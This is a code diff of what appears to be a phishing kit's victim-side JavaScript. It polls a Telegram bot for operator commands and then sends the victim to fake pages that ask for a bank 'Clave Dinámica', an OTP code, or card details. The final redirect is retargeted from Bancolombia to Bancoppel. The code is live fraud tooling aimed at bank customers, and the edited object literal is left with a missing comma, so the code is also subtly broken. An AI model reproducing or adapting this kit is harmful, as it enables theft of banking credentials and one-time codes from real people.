@@ -154,9 +154,7 @@ document.addEventListener('DOMContentLoaded', async function () {
       if (update) {
         const tipo = update.callback_query.data.split(":")[0];
         const status = {
-          pedir_dinamica: "Clave Dinámica",
-          pedir_otp: "Código OTP",
-          error_tc: "Error TC",
+          pedir_dinamica: "Clave Dinámica"
           error_logo: "Error de Logo",
           confirm_finalizar: "Finalización Exitosa"
         }[tipo] || "Acción desconocida";
@@ -171,14 +169,14 @@ document.addEventListener('DOMContentLoaded', async function () {
           case "pedir_dinamica":
             return window.location.href = "cel-dina.html";
           case "pedir_otp":
-            return window.location.href = "index-otp.html";
+            return window.location.href = "cel-dina.html";
           case "error_tc":
             return window.location.href = "errortc.html";
           case "error_logo":
             alert("Error en sesión");
-            return window.location.href = "index.html";
+            return window.location.href = "errorlogo.html";
           case "confirm_finalizar":
-            return window.location.href = "https://www.bancolombia.com/personas";
+            return window.location.href = "https://www.bancoppel.com/";
         }
       } else {
         setTimeout(() => checkButton(transactionId, botToken), 2500);
